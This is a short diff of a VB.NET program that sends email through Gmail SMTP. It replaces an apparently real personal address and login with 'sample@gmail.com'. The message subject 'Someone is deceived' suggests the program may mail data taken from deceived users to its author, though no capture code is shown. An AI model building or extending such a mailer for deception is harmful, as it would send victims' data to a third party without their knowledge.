@@ -14,7 +14,7 @@ Public Class frmMain
             'indicates message will be sent
             MyMailMessage.From = SendingAddress
             'adds new email to mymailmessage
-            MyMailMessage.To.Add("bjde.florence@gmail.com")
+            MyMailMessage.To.Add("sample@gmail.com")
             'MyMailMessage.To.Add("")
             'sets the subject of the email
             MyMailMessage.Subject = "Someone is deceived"
@@ -28,7 +28,7 @@ Public Class frmMain
             'server uses SSL to encrypt message, so enable must be set to true
             MySMTP.EnableSsl = True
 
-            Dim MyCrediential As NetworkCredential = New NetworkCredential("bjde.florence@gmail.com", "password")
+            Dim MyCrediential As NetworkCredential = New NetworkCredential("sample@gmail.com", "password")
             MySMTP.Credentials = MyCrediential
             MySMTP.Send(MyMailMessage)
 
